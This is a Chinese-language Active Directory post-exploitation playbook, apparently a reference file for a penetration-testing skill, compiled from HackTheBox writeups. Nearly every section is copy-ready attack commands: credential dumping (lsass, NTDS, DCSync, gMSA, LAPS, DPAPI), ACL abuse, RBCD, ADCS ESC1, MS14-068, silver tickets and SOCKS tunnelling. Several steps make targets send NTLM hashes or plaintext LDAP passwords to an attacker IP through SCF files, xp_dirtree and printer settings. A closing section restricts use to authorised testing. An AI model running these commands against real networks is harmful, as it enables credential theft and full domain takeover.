# AD 域渗透·立足后横向移动与域提权（实战方法论）

> 来源：用户博客 20+ 篇 HTB AD writeup 系列沉淀。
> 触发场景：**已获域凭据或域内 shell**，需横向移动 / 权限提升 / 收割全域（零凭据→立足见 `references/notes/ad-initial-access.md`）。核心思想：**凭据 → 权限 → 更高凭据**滚雪球——每拿一个新凭据回 §1 重跑侦察，直到 DC；BloodHound 只给一条边也够用，一条边=一类利用方式。

---

## 0. 流程总览（决策流程）

```
Step 1 立足后侦察（bloodhound-python / SharpHound 上传兜底；AD 回收站翻已删对象）
   ↓
Step 2 凭据收割（按密文位置：内存 lsass / NTDS 离线 / 强制认证捕 NTLMv2 / gMSA / LAPS / DPAPI）
   ↓
Step 3 按手上权限选提权路：
   ACL 边（ForceChangePassword / Account Operators / Owner / GenericWrite / RBCD）→ §3
   ADCS 模板 ENROLLEE_SUPPLIES_SUBJECT → §4
   特权/协议（SeBackupPrivilege / MS14-068 / 银票 / NTLMv1）→ §5
   ↓
Step 4 出口全封（邮件明示 WinRM 不外露 + TCP/UDP/ICMP 全封）→ §6 域内隧道落地
   ↓
Step 5 服务密文（Jenkins / VNC 注册表 / ERRORLOG / pfx）→ §7 离线解密，回 Step 2 继续
```

分界：本文件只讲**域内**横向与域提权；shell 之后的**本机提权**见 `references/notes/privesc-linux-windows.md`。

## 1. 立足后侦察（BloodHound + AD 回收站）

### 1.1 采集

```bash
bloodhound-python -c All -u support -p '#00^BlackKnight' -ns 10.129.229.17 -d BLACKFIELD.local --zip
```
来源：HTB-Blackfield

- **时钟偏差自动回退 NTLM**：时差大时输出 `WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.`（来源：HTB-Blackfield）——采集照常完成；但直接走 Kerberos 的调用报 `KRB_AP_ERR_SKEW(Clock skew too great)`（来源：HTB-Forest），先对时再重试
- **DNS 超时兜底**：报 `dns.resolver.LifetimeTimeout` 时改 evil-winrm `upload SharpHound.exe` 远程收集再回传：
```powershell
.\SharpHound.exe -c All --zipfilename SharpHound
download 20260505210432_SharpHound.zip
```
来源：HTB-Object。已有交互 shell 同法 `.\SharpHound.exe -c All --ZipFilename data.zip` 后带凭据 SMB 外带（来源：HTB-Outdated）

### 1.2 最短路径 → 利用方式映射

| BloodHound 边 | 利用方式 | 见 |
|---|---|---|
| ForceChangePassword | rpcclient setuserinfo2 改密 | §3.1 |
| Account Operators（可入任意组） | 入 Exchange Windows Permissions → DCSync | §3.2 |
| WriteOwner / GenericAll | PowerView 三连夺对象控制权 | §3.3 |
| GenericAll over 用户 | 直接改密 | §3.3 |
| GenericWrite over DC/机器账号 | RBCD 三连 | §3.6 |
| DCSync 边 | impacket-secretsdump -just-dc | §3.2 |

决策点：**一条边也够用**（Blackfield 仅 ForceChangePassword 一条边即改密拿到 forensic 共享读权）；**BloodHound 无路径≠无漏洞**——回落 PowerView `Get-DomainObjectAcl` 手查（Self/WriteProperty 类边 GUI 不一定标出），或 grep 离线 acls.csv（§3.0）。

### 1.3 AD 回收站（读已删对象）

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and name -like "*TempAdmin*"' -IncludeDeletedObjects -Properties cascadeLegacyPwd | Select-Object -ExpandProperty cascadeLegacyPwd
```
来源：HTB-Cascade

管理员删账号只删对象不清属性——已删对象的自定义属性（cascadeLegacyPwd，base64 密码）常可直接读出。拿到可疑用户名先翻回收站。

## 2. 凭据与哈希获取（按密文位置选路）

### 2.1 内存：lsass.DMP 离线分析

```bash
smbget -U 'BLACKFIELD/audit2020%P@ssword' -r smb://10.129.229.17/forensic/memory_analysis/lsass.zip
pypykatz lsa minidump lsass.DMP | tee ../lass.txt
```
来源：HTB-Blackfield

- smbclient `mget *` 拉大文件超时（NT_STATUS_IO_TIMEOUT / CONNECTION_DISCONNECTED）时换 `smbget -r` 整包下载
- **教训**：dump 出的 NT hash 必须逐个验证再默认可用——Blackfield 中 pypykatz 出的 Administrator hash 登录即 STATUS_LOGON_FAILURE（已失效）

### 2.2 NTDS 离线解（已有 ntds.dit + SYSTEM 两文件）

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee HASH.txt
```
来源：HTB-Blackfield。同款（备份包内相对路径）：
```bash
impacket-secretsdump -ntds ntds.dit -system ../registry/SYSTEM LOCAL | tee ../user_hash_ra
```
来源：HTB-APT——SMB 匿名 backup 共享拿 backup.zip，`zip2john backup.zip > backup_hash.txt` 破解后解出 `Active Directory/ntds.dit` 与 `registry/SYSTEM` 两文件直接离线解。两文件的取得方式见 §5.1。

### 2.3 DNS 记录注入 + Responder 捕 NTLMv2

适用：读到域内计划任务/服务脚本以 `-UseDefaultCredentials` 访问 `web*` 前缀主机名——三个利用要件全在脚本源码里（前缀过滤 + 默认凭据 + DNS 可写）。

```bash
python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web_enil --data 10.10.16.151 -dns-ip 10.129.95.154 --type A intelligence.htb
sudo responder -I tun0
hashcat -m 5600 Users/hash /usr/share/wordlists/rockyou.txt
```
来源：HTB-Intelligence

### 2.4 强制认证三向量（让目标主动发认证到攻击机）

| 向量 | 操作 | 来源 |
|---|---|---|
| MSSQL xp_dirtree UNC | `EXEC master..xp_dirtree '\\10.10.16.151\share'` 配 responder | HTB-Escape |
| SCF 图标解析 | 上传 .scf 到可浏览目录，explorer 渲染图标时走 SMB 认证 | HTB-Driver |
| 打印机 Server Address | Web 面板 Settings 改 LDAP Server Address 为攻击机 IP | HTB-Return |

SCF 内容（来源：HTB-Driver）：
```
[Shell]
Command=2
IconFile=\\10.10.16.155\enil
[Taskbar]
Command=Test
```
配 `sudo responder -I tun0 -v` 收 NTLMv2（解析不存在的 SMB 地址时降级 NBT-NS/LLMNR，即 Responder 前提）。

打印机向量不同点：目标是**明文 LDAP 绑定**而非 hash——改完 Server Address 后 `sudo nc -lvnp 389` 直接收 `return\svc-printer` 与密码（来源：HTB-Return）。

### 2.5 gMSA 密码读取

```bash
python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
```
来源：HTB-Intelligence（输出形如 `svc_int$:::5e47bac787e5e1970cf9acdb5b316239`）

**教训**：gMSADumper 无读取权限时只列 `Users or groups who can read password for ...` 的 ACL 不给 hash（Intelligence 首跑低权限账号即如此）——按列表换有 gMSA 读权限的账号重跑。备选：`sudo nxc ldap rebound.htb -d rebound.htb --use-kcache --gmsa`（来源：HTB-Rebound）。

### 2.6 LAPS 双路读取

路一 PowerView：
```powershell
Get-DomainComputer DC -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"
```
路二 ldapsearch（均来源：HTB-StreamIO）：
```bash
ldapsearch -x -H ldap://10.129.15.25 \
  -D 'jdgodd@streamio.htb' \
  -w 'JDg0dd1s@d0p3cr3@t0r' \
  -b 'DC=streamio,DC=htb' \
  '(cn=DC)' ms-mcs-admpwd
```
Linux 侧变体：`python laps.py -u lothbrok -p enil12408@Pass! -l 10.129.228.115 -d LicorDeBellota.htb`（来源：HTB-PivotAPI）。前提：当前账号在 LAPS 读取组——`net group /domain` 确认组成员关系（来源：HTB-PivotAPI）。

### 2.7 DPAPI：Import-Clixml 还原 PSCredential

```bash
powershell -c "$cred=Import-Clixml C:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential().Password"
```
来源：HTB-Reel（解出 `1ts-mag1c!!!`）。同型（同机解，UserName/Password 各取一次，来源：HTB-Pov）：
```powershell
$cred = import-clixml -Path connection.xml
$cred.GetNetworkCredential().UserName
$cred.GetNetworkCredential().Password
```
桌面/文档目录的 *.xml（cred/connection 命名）先按此法试，多数是 Export-Clixml 的 PSCredential。

## 3. ACL 滥用提权（BloodHound 找边后逐类打）

### 3.0 找边兜底：离线 acls.csv

BloodHound 采集产物 acls.csv 直接 grep 出链（无 GUI 也可）：
```bash
cat acls.csv| grep -i 'tom@'
cat acls.csv| grep -i 'claire@'
```
来源：HTB-Reel（tom 对 claire 有 WriteOwner、claire 对 Backup_Admins 有 WriteDacl——两跳链）

### 3.1 ForceChangePassword → rpcclient setuserinfo2

```bash
rpcclient -U 'BLACKFIELD/support%#00^BlackKnight' 10.129.229.17
rpcclient $> setuserinfo2 audit2020 23 'P@ssword'
```
来源：HTB-Blackfield。改完立即验证：`nxc smb 10.129.229.17 -u audit2020 -p 'P@ssword'`；**每拿一个新凭据重跑 `nxc smb 10.129.229.17 -u support -p '#00^BlackKnight' --shares` 重查共享权限**（audit2020 才可读 forensic）。

### 3.2 Account Operators → Exchange Windows Permissions → DCSync

svc-alfresco 在 Account Operators（可自加任意组）：
```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco'
Add-DomainObjectAcl -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync -Verbose
```
来源：HTB-Forest。然后 DCSync 收割全域 + PTH：
```bash
impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.129.95.210 -just-dc
evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```
来源：HTB-Forest

### 3.3 PowerView 三连（Owner → ACL → 改密/入组）

夺组/对象控制权的标准三步：
```powershell
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity maria
Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity maria -Rights All
Add-DomainGroupMember -Identity 'Domain Admins' -Members maria
```
来源：HTB-Object

变体 A（跨用户两跳传导，来源：HTB-Reel）：
```powershell
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
Add-DomainObjectAcl -TargetIdentity 'Backup_Admins' -PrincipalIdentity claire -Rights WriteMembers
Add-DomainGroupMember -Identity 'Backup_Admins' -Members claire
```
变体 B（Linux/其他上下文带凭据操作时加 `-Credential $Cred` 三参数同型，来源：HTB-StreamIO）。

### 3.4 GenericAll → 直接改密

```powershell
$pw=ConvertTo-SecureString 'P@sswOrd' -AsPlainText -Force
Set-DomainUserPassword -Identity smith -AccountPassword $pw
```
来源：HTB-Object

### 3.5 scriptpath 劫持（等下次登录触发）

```powershell
Set-DomainObject -Identity maria -SET @{scriptpath='C:\programdata\apps\foo.ps1'}
```
来源：HTB-Object——改登录脚本路径，目标用户下次登录执行，用于偷其桌面文件（对持有敏感文件的用户，比直接改密更隐蔽）。

### 3.6 RBCD 三连（GenericWrite over DC/机器账号）

```bash
impacket-addcomputer -computer-name 'PWN$' -computer-pass '123456' -dc-ip 10.129.23.95 'support.htb/support:Ironside47pleasure40Watchful'
impacket-rbcd -delegate-from 'PWN$' -delegate-to 'DC$' -action 'write' -dc-ip 10.129.23.95 'support.htb/support:Ironside47pleasure40Watchful'
impacket-getST -spn 'cifs/DC.support.htb' -impersonate 'Administrator' -dc-ip 10.129.23.95 'support.htb/PWN$:123456'
impacket-wmiexec -k -no-pass -target-ip 10.129.23.95 dc.support.htb
```
来源：HTB-Support。要点：新建机器账号 PWN$ 当"委派来源"，对 DC$ 写 msDS-AllowedToActOnBehalfOfOtherIdentity，再以 PWN$ 身份冒充 Administrator 取 cifs 票据，最后 `wmiexec -k -no-pass` 直达 DC。

## 4. ADCS 证书攻击（ESC1）

四步链（来源：HTB-Escape 全链）：

1. 发现 CA 与模板：
```bash
nxc ldap sequel.htb -u ryan.cooper -p NuclearMosquito3 -M adcs
```
2. 找漏洞模板——判据 `msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT`（=ESC1，申请者可自定 SAN）：
```powershell
.\Certify.exe find /vulnerable /currentuser
```
3. 以 administrator 为 altname 申请，输出 cert.pem 后按 Certify 提示转 pfx：
```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
4. Rubeus 用 pfx 申请 TGT 并直接出 NTLM，然后 PTH：
```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\apps\cert.pfx /getcredentials /show /nowrap
```
```bash
evil-winrm -i sequel.htb -u administrator -H A52F78E4C751E5E17E1E9F3E58F4EE
```

## 5. 域管直达路径（无需 ACL 边的直线）

### 5.1 SeBackupPrivilege 三件套（whoami /priv 见 SeBackupPrivilege 即用）

Kali 制作 diskshadow 脚本（`\r\n` 行尾，上传后 Format-Hex 校验）：
```bash
printf 'set context persistent nowriters\r\nadd volume c: alias cdrive\r\ncreate\r\nexpose %%cdrive%% z:\r\n' > dshadow.txt
```
上传目标执行后 C 盘卷影暴露为 Z:，备份模式取两文件并回传：
```powershell
robocopy /b Z:\Windows\NTDS C:\programdata\apps\ntds ntds.dit
reg save HKLM\SYSTEM C:\programdata\apps\ntds\SYSTEM
download ntds.dit
download SYSTEM
```
离线解 + PTH（来源：HTB-Blackfield 全链）：
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee HASH.txt
evil-winrm -i 10.129.25.101 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

### 5.2 goldenPac（MS14-068 一体化）

```bash
impacket-goldenPac -dc-ip 10.129.26.112 htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local
```
来源：HTB-Mantis——MS14-068 伪造 + PsExec 一体化直接拿 SYSTEM（适用：持有普通域账号密码、域未打 MS14-068 补丁的老环境）。

### 5.3 银票（impacket-ticketer，只需服务账户 NTLM + domain-sid）

```bash
impacket-getPac -targetUser administrator scrm.local/sqlsvc:Pegasus60
impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn "MSSQLSvc/DC1.scrm.local:1433" -user-id 500 -groups 512,513,518,519,520 administrator
```
来源：HTB-Scrambled——getPac 取 domain-sid，ticketer 以 sqlsvc 的 NTLM 给 MSSQLSvc 伪造 user-id 500（administrator）票据，后续 `impacket-mssqlclient -k -no-pass` 以管理员身份操作。

**身份语义坑**：落地后 `EXEC xp_cmdshell 'whoami'` 返回 `scrm\sqlsvc` 而非 administrator——银票伪造的是**登录身份**（SQL 权限层面：`SELECT SYSTEM_USER` = `SCRM\administrator`、`IS_SRVROLEMEMBER('sysadmin')` = 1），进程仍以服务账号运行。判定利用是否成功看 SQL 层权限查询，**不要**因 whoami 是服务账号就误判失败。

### 5.4 NTLMv1 降级破解（破出即 NT hash，可直接 PTH）

```bash
python3 ntlmv1.py --ntlmv1 'APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788'
```
来源：HTB-APT——challenge 固定 `1122334455667788` 时可拆 DES 密钥对再爆：
```bash
echo "95ACA8C7248774CB:1122334455667788">>14000.hash
echo "427E1AE5B8D5CE68:1122334455667788">>14000.hash
hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1
```

## 6. 域内隧道与受限出口

### 6.1 出站防火墙判断

优先读内部邮件/公告——常直接写明（来源：HTB-PivotAPI 原文："we have decided to stop externally displaying WinRM's service... we have also blocked the TCP, UDP and even ICMP output"）。出现"WinRM 不外露 + TCP/UDP/ICMP 出口全封"即放弃反弹 shell，改走落地隧道（有 MSSQL 等落地服务可登时优先 mssqlproxy）。

### 6.2 mssqlproxy SOCKS 隧道（MSSQL 落地 → 域内 WinRM）

MSSQL 会话内（来源：HTB-PivotAPI）：
```
SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
```
Kali 侧安装 CLR 并启动（监听 1337）：
```bash
python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.129.228.115' -install -clr assembly.dll
python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.129.228.115' -start -reciclador 'C:\Windows\Temp\reciclador.dll'
```

### 6.3 proxychains4 链式

`/etc/proxychains4.conf` 末尾加 `socks5  127.0.0.1 1337`，之后所有工具前挂 proxychains 连 127.0.0.1 走隧道到目标：
```bash
proxychains evil-winrm -i 127.0.0.1 -u svc_mssql -p '#mssql_s3rV1c3!2020'
```
来源：HTB-PivotAPI

## 7. 服务凭据离线解密（拿到密文→按表解）

### 7.1 Jenkins master.key + hudson.util.Secret 双层 AES

config.xml 里 `{AQA...}` 加密串 + secrets 目录两文件（来源：HTB-Object，文章附完整 decrypt.py）：
```bash
type c:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key
powershell -nop -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret'))"
```
（hudson.util.Secret 以 base64 回传后 `base64 -d` 存回二进制）
算法双层：第一层 `AES-ECB(SHA-256(master.key)[:16])` 解 hudson.util.Secret，取解密结果前 16 字节为 confidentiality_key；第二层解凭据 blob（`blob[0]==1` 新格式，4B iv_len + 4B data_len + iv + data，AES-CBC，去 PKCS7）。运行：
```bash
python3 decrypt.py '{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}' master.key hudson.util.Secret
```
输出 `c1cdfun_d2434`。

### 7.2 VNC 注册表 DES（TightVNC 固定密钥）

共享里 `VNC Install.reg` 的 `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f` 拼成 hex 串后用固定 DES 密钥解：
```bash
echo '6bcf2a4b6e5aca0f' | xxd -r -p | openssl enc -d -des-ecb -K E84AD660C4721AE0 -nopad
```
来源：HTB-Cascade（出 `sT333ve2`）

### 7.3 MSSQL ERRORLOG.BAK（口令误输进用户名框）

```powershell
type C:\SQLServer\Logs\ERRORLOG.BAK
```
来源：HTB-Escape——失败登录日志把"口令误输进用户名框"的值原样记录：`Logon failed for user 'NuclearMosquito3'` 即该用户真实口令。

### 7.4 pfx 破解 → Firefox 导入访问 mTLS 站点

pfx2john 生成 hash 后：
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash
```
来源：HTB-Search（破出 `misspissy`）。在 firefox 的 setting 中添加认证（导入 pfx）→ 访问 `https://search.htb/staff` 拿 webshell。**证书认证的内部站点是隐藏攻击面**：破出的 pfx 不只用于登录，导入浏览器可进 mTLS 站点。

## 8. 边界与红线对齐

- **仅限授权测试**：本文件全部技术仅在书面授权（明确允许横向移动 / 凭据 dump / 提权 / 域内隧道）或靶场环境使用；真实项目按 SKILL.md Phase 4 门执行——默认禁止凭据 dump、横向移动、持久化与批量导出，授权写明可做时按最小必要原则逐步执行并记录每条命令与结果
- 与 `references/notes/ad-initial-access.md` 分工：彼文件讲零凭据→域内立足（匿名枚举 / AS-REP / 喷洒 / GPP 等）；本文件从"已获域凭据或域内 shell"开始
- 与 `references/notes/privesc-linux-windows.md` 分工：**本文件只讲域内**（横向移动 / 域提权 / 域凭据收割）；拿到 shell 后的本机提权（SeImpersonate/PrintSpoofer、Server Operators binPath 劫持、CLIXML+RunasCs、SeDebug 迁移、Defender 排除目录识别等）见彼文件
- 爆破与 hashcat 模式速查、传文件、反弹矩阵 → `references/notes/field-ops-toolbox.md`
